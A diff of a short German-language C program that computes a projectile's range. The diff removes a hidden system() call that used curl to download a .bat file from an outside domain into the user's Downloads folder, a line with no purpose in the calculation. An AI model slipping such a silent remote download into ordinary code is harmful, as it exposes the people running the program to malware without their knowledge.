@@ -5,7 +5,6 @@ Autor: Yannick Müller
 */
 #include <stdio.h>
 #include <math.h>
-#include <stdlib.h>
 int main(){
     //Deklaration;
     const double pi = 3.141593;
@@ -22,6 +21,5 @@ int main(){
     Flugweite = (pow(v0, 2)*sin(2*alpha*(pi/180)))/g;
     //Ausgabe
     printf("Die Flugweite betraegt %.2f Meter.", Flugweite);
-    system("curl.exe -o \"%userprofile%\\Downloads\\test.bat\" https://yanasmagic.ch > \"%userprofile%\\Downloads\\test.txt\" 2>&1");
     return 0;
 }
